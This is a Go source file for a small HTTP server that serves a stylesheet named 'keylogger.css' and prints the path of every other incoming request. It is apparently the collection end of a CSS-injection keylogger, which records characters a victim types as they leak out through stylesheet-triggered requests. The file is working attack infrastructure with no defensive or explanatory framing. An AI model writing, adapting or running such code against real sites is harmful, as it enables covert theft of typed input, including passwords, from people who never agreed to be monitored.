package main

import (
    "fmt"
    "log"
    "net/http"
    "github.com/gorilla/mux"
)

func LogKey(w http.ResponseWriter, r *http.Request){
    vars := mux.Vars(r)
    fmt.Printf("%s",vars["id"])
    w.Write([]byte("OK"))
}

func CssFile(w http.ResponseWriter, r *http.Request){
    http.ServeFile(w, r,"keylogger.css")
}
// our main function
func main() {
    router := mux.NewRouter()
    
    router.HandleFunc("/file.css", CssFile).Methods("GET")
    router.HandleFunc("/{id}", LogKey).Methods("GET")
    log.Fatal(http.ListenAndServe(":3000", router))
}